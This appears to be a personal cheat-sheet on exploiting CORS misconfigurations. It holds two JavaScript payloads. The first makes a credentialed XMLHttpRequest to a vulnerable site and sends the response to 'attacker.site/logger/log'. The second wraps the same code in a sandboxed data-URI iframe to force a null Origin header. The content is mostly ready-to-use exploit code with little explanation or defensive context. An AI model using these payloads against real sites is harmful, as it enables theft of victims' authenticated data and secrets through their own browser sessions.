# ------------------------------- start CORS exploitation ------------------------------- #
    # ------- XHR get request:
        - using this technique to send GET request with origin's value contain the domain name that perform the action.
         
        - exploit code:
            <script>
                (function loadXMLDoc() {
                    var xhttp;
                    if (window.XMLHttpRequest) {	// ------ for new browsers
                            xhttp 	= new XMLHttpRequest();
                        } else { // ------ for old browsers IE5 IE6
                            xhttp 	= new ActiveXObject('Microsoft.XMLHTTP');
                        }
                    xhttp.onreadystatechange = function() {
                        if (this.readyState == 4 && this.status == 200) {
                            // document.getElementById('demo').innerHTML = xhttp.responseText;
                        }
                    };
                    xhttp.onload = reqListner;
                    xhttp.open("GET","vulnerable.site/path", true);
                    xhttp.withCredentials = true;
                    // xhttp.setRequestHeader("Ctest", "evil.com");     // For Customer Header
                    xhttp.send();

                    function reqListner(){
                        location = 'attacker.site/logger/log?key='+encodeURIComponent(this.responseText);
                    }
                    })();
            </script> 


    # ------- XHR request through iframe:
        - using this technique to enforce browser to send origin's value equal to null 
    
        - exploit code:
            <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> // XHR code statement(s)</script>"></iframe>

        - exmaple one exploit:
            <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>(function loadXMLDoc() {var xhttp;if (window.XMLHttpRequest) {	xhttp 	= new XMLHttpRequest();} else {xhttp 	= new ActiveXObject('Microsoft.XMLHTTP');}xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200) {alert(1);}};xhttp.onload = reqListner;xhttp.open('GET','vulnerable.site/path', true);xhttp.withCredentials = true;xhttp.send();function reqListner(){location = 'attacker.site/logger/log?key='+encodeURIComponent(this.responseText);}})();</script>"></iframe>


# -------------------------------   end CORS exploitation ------------------------------- # 
